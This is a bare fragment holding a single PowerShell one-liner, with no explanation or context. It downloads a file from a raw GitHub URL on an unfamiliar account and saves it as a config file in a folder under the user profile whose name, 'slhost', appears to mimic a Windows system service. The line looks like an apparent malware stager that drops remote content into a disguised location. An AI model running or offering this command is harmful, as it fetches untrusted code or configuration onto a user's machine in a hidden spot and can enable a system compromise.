...
powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/gta.json','%USERPROFILE%\.cache\services\slhost\config.json')"
